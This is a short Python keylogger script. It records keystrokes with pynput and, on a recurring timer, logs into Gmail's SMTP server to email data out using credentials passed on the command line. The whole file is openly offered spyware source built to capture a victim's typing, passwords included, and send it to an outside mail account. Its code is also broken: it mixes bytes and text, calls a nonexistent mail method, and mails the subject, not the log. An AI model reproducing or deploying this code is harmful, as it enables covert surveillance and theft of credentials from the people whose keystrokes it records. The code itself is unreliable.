import  pynput.keyboard
import smtplib
import threading
import optparse

def get_user_input():

    parse_obj = optparse.OptionParser()
    parse_obj.add_option("-e", "--email", dest="emails", help="Enter your email address")
    parse_obj.add_option("-p", "--password", dest="passwords", help="Enter your email password")
    parse_obj.add_option("-m", "--message", dest="messages", help="Specify a message subject")
    (user_input, arguments) = parse_obj.parse_args()
    if not user_input.emails:
        print("Enter your email address")
    if not user_input.passwords:
        print("Enter your email password")
    if not user_input.messages:
        print("Specify a subject")

    return user_input


log = ""

def callback_function(key):
    global log
    try:
        log += key.char.encode("utf-8")

    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += str(key)

    #print(log)

def send_mail(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.send(email, email, message)
    email_server.quit()

def thread_function():
    global log
    user_input = get_user_input()
    send_mail(user_input.emails, user_input.passwords, user_input.messages)
    log = ""
    timer_object = threading.Timer(3000, thread_function)
    timer_object.start()

keylogger_listenner = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listenner:
    thread_function()
    keylogger_listenner.join()
